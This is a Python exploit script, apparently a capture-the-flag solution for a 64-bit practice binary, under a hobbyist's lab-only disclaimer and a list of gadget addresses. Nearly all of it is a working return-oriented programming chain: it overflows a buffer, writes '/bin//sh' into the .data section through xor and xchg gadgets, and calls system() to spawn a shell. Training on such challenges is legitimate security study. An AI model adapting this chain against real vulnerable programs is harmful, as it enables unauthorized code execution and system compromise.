'''
@Author: Captain Darkshade
Twitter: @cdarkshade
YouTube: Captain Darkshade

Disclaimer: I am not a security professional nor do I consider myself as an expert. 
I am nothing more than a security enthusiast and a beginner at best. Scanning and 
attacking networks and computers without express permission is illegal in many countries. 
Code samples are provided as is and without warranty. All demos conducted in my own isolated lab

0x4005e0 <system@plt>

.data         00000010  0000000000601050

40084e <+46>:	mov    QWORD PTR [r10],r11

4008c3 : pop rdi ; ret

400822 <+2>:	xor    r11,r11

40082f <+15>:	xor    r11,r12

400832 <+18>:	pop    r12

400840 <+32>:	xchg   r11,r10

'''

import struct
import sys

string = "/bin//sh"

def packQword(addr):
    return struct.pack('<Q', addr)

buf = b''
buf += 'A' * 40

# get address into R10
buf += packQword(0x400832) # pop R12
buf += packQword(0x601050) # put address to data on th stack
buf += packQword(0x400822) # set R11 to 0x0
buf += "fillerrr"          # handle fluff pop R14
buf += packQword(0x40082f) # use XOR to move address into R11
buf += "fillerrr"          # handle fluff pop R12
buf += packQword(0x400840) # XCHG R11 and R10
buf += "fillerrr"          # handle fluff pop R15

# get string ito R11
buf += packQword(0x400832) # pop R12
buf += string
buf += packQword(0x400822) # set R11 to 0x0
buf += "fillerrr"          # handle fluff pop R14
buf += packQword(0x40082f) # use XOR to move string into R11
buf += "fillerrr"          # handle fluff pop R12

# write string to .data
buf += packQword(0x40084e) # move QWORD
buf += "fillerrr"          # handle fluff pop R13
buf += packQword(0x0)      # set up to handle XOR

# pop RDI
buf += packQword(0x4008c3)
buf += packQword(0x601050) # put address to data on th stack

# call system
buf += packQword(0x4005e0)

sys.stdout.write(buf)
